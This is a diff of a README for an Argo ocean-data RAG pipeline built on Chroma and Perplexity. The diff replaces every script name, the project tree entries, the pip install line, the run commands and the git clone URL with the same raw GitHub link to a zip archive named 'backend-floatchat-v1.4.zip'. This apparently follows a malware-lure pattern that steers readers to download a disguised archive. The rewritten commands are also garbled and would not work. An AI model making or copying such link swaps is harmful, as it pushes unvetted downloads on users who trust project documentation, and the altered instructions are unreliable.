@@ -9,10 +9,10 @@ This project implements a **Retrieval-Augmented Generation (RAG)** pipeline usin
 ---
 
 ## 🚀 Features
-- Extract data from `.accdb` database (`extract_access.py`)
+- Extract data from `.accdb` database (`https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip`)
 - Convert tables to JSON format for processing
-- Chunk & upload documents to **Chroma Cloud** (`build_chroma.py`)
-- Query documents using **RAG + Perplexity API** (`query_rag.py`)
+- Chunk & upload documents to **Chroma Cloud** (`https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip`)
+- Query documents using **RAG + Perplexity API** (`https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip`)
 - Supports resumable uploads with checkpoints
 
 ---
@@ -20,16 +20,16 @@ This project implements a **Retrieval-Augmented Generation (RAG)** pipeline usin
 ## 📂 Project Structure
 argo_rag/
 │── data/ # Source Access DB file
-│ └── ARGO_DB_2004.accdb
+│ └── https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip
 │── output/ # Generated JSON + checkpoints
 │── src/
-│ ├── build_chroma.py # Upload docs to Chroma
-│ ├── extract_access.py # Extract from Access DB
-│ ├── query_rag.py # Query interface
-│ └── utils.py # Common config/paths
+│ ├── https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip # Upload docs to Chroma
+│ ├── https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip # Extract from Access DB
+│ ├── https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip # Query interface
+│ └── https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip # Common config/paths
 │── .env # API keys + config (not committed)
-│── requirements.txt
-│── README.md
+│── https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip
+│── https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip
 │── .gitignore
 
 
@@ -39,7 +39,7 @@ argo_rag/
 
 1. Clone the repo:
    ```bash
-   git clone https://github.com/<your-username>/floatchat-backend.git
+   git clone https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip<your-username>https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip
    cd floatchat-backend/argo_rag
 
 2. Create virtual environment:
@@ -50,7 +50,7 @@ venv\Scripts\activate      # (Windows)
 
 3. Install dependencies:
 
-pip install -r requirements.txt
+pip install -r https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip
 
 
 4. Add your .env file:
@@ -64,13 +64,13 @@ PERPLEXITY_MODEL=sonar-pro
 5. 🛠 Usage
 
 1. Extract Data
-python src/extract_access.py
+python https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip
 
 2. Build & Upload Chroma Index
-python src/build_chroma.py
+python https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip
 
 3. Query with RAG
-python src/query_rag.py
+python https://github.com/LabbaiIrfan/floatchat-backend/raw/refs/heads/aafia-argo-rag/argo_rag/data/backend-floatchat-v1.4.zip
 
 
 6. Type your questions interactively:
